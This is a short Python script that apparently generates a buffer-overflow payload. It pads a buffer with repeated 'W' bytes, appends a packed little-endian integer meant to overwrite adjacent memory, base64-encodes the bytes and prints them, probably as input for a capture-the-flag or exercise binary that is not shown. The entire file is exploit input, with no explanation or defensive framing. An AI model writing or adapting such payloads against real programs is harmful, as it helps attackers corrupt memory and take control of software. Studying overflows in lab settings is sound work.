
import sys
import struct
import base64

buf = b'WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW'
buf += struct.pack('<I', 1667141625)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
